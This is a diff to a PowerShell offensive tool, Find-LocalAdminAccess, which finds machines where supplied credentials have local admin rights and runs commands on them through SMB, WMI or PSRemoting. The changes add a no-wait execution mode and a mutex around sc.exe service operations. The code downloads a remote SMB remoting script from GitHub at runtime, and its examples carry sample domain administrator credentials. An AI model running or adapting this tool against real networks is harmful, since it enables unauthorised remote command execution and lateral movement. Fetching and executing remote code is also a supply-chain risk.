@@ -20,25 +20,28 @@ function Find-LocalAdminAccess {
 	
 	.PARAMETER Password
 	Password for the UserName (Works with WMI and PSRemoting only)
-
- 	.PARAMETER Command
+	
+	.PARAMETER Command
 	Command to execute on targets where we are admin (Works for all methods if Credentials are not provided, otherwise WMI and PSRemoting only)
 	
-	.PARAMETER ShowErrors
-	Show Errors
+	.PARAMETER NoOutput
+	Won't wait for the command to complete and won't show output
+	
+	.PARAMETER NoOutput
+	Won't wait for the command to complete and won't show output
+	
+	.PARAMETER scsafe
+	Safe sc operations when method SMB is used
 
  	.PARAMETER SaveOutput
 	Save tool output
 	
 	.EXAMPLE
 	Find-LocalAdminAccess -Method SMB
- 	Find-LocalAdminAccess -Method SMB -Command "whoami /all"
-  	Find-LocalAdminAccess -Method WMI
-	Find-LocalAdminAccess -Method WMI -Command "whoami /all"
+	Find-LocalAdminAccess -Method WMI
 	Find-LocalAdminAccess -Method PSRemoting
- 	Find-LocalAdminAccess -Method PSRemoting -Command "whoami /all"
- 	Find-LocalAdminAccess -Method WMI -UserName "ferrari\Administrator" -Password "P@ssw0rd!" -Command "whoami /all"
-	Find-LocalAdminAccess -Method PSRemoting -UserName "ferrari\Administrator" -Password "P@ssw0rd!" -Command "whoami /all"
+ 	Find-LocalAdminAccess -Method WMI -UserName "ferrari\Administrator" -Password "P@ssw0rd!"
+	Find-LocalAdminAccess -Method PSRemoting -UserName "ferrari\Administrator" -Password "P@ssw0rd!"
 	
 	#>
 	
@@ -48,12 +51,14 @@ function Find-LocalAdminAccess {
         	[string]$Method,
         	[string]$UserName,
         	[string]$Password,
-	 	[string]$Command,
+			[string]$Command,
 		[switch]$ShowErrors,
+		[switch]$scsafe,
+		[switch]$NoOutput,
   		[switch]$SaveOutput
     	)
 	if(!$ShowErrors){
-		$ErrorActionPreference = "SilentlyContinue"
+		#$ErrorActionPreference = "SilentlyContinue"
 		$WarningPreference = "SilentlyContinue"
 	}
 	
@@ -227,11 +232,8 @@ function Find-LocalAdminAccess {
 			Write-Output ""
 	    	}
 	} else {Write-Output ""}
-
- 	if ($Command) {
-		
-		Write-Output "[+] Executing Command on Targets.."
-		Write-Output ""
+	
+	if ($Command) {
 		
 		$ComputerAccess = $ComputerAccess | Sort-Object
 
@@ -246,6 +248,10 @@ function Find-LocalAdminAccess {
 		}
 		if ($Method -eq 'SMB') {
 			$SmbScript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Invoke-SMBRemoting/main/Invoke-SMBRemoting.ps1')
+			# Initialize a mutex to synchronize access to sc.exe operations
+			if($scsafe){
+				$Mutex = [System.Threading.Mutex]::new($false, 'SCMutex')
+			}
 		}
 
 		# Create and open a runspace pool
@@ -291,22 +297,42 @@ function Find-LocalAdminAccess {
 		}
 
 		$JobObjects = @()
+		
+		if ($Method -eq 'SMB' -AND $scsafe) {
+			foreach ($Computer in $ComputerAccess) {
+				[void]$Mutex.WaitOne()
+				try {
+					$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
+					$Job.RunspacePool = $RunspacePool
+					$JobObjects += @{
+						PowerShell = $Job
+						Handle     = $Job.BeginInvoke()
+					}
+				} finally {
+					$Mutex.ReleaseMutex()
+				}
+			}
+		}
+		
+		else{
 
-		foreach ($Computer in $ComputerAccess) {
-			$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
-			$Job.RunspacePool = $RunspacePool
-			$JobObjects += @{
-				PowerShell = $Job
-				Handle     = $Job.BeginInvoke()
+			foreach ($Computer in $ComputerAccess) {
+				$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
+				$Job.RunspacePool = $RunspacePool
+				$JobObjects += @{
+					PowerShell = $Job
+					Handle     = $Job.BeginInvoke()
+				}
 			}
 		}
 
 		# Wait for all jobs to complete
-		$JobObjects | ForEach-Object { $_.Handle.AsyncWaitHandle.WaitOne() } > $null
+		if(!$NoOutput){
+			$JobObjects | ForEach-Object { $_.Handle.AsyncWaitHandle.WaitOne() } > $null
 
-		foreach ($Job in $JobObjects) {
-			$Result = $Job.PowerShell.EndInvoke($Job.Handle)
-			if(!$NoOutput){
+			foreach ($Job in $JobObjects) {
+				$Result = $Job.PowerShell.EndInvoke($Job.Handle)
+				
 				if ($Result.Error) {
 					Write-Output "$($Result.ComputerName): Error - $($Result.Error)"
 				} else {
@@ -315,13 +341,18 @@ function Find-LocalAdminAccess {
 					Write-Output ""
 					Write-Output ""
 				}
+				
+				$Job.PowerShell.Dispose()
 			}
-			$Job.PowerShell.Dispose()
+			
+			$RunspacePool.Close()
 		}
-
-		$RunspacePool.Close()
 		
-		Write-Output ""
+		if ($Method -eq 'SMB' -AND $scsafe) {
+			# Release the mutex
+			$Mutex.Dispose()
+		}
+		
 		Write-Output "[+] Command execution completed"
 		Write-Output ""
 	}
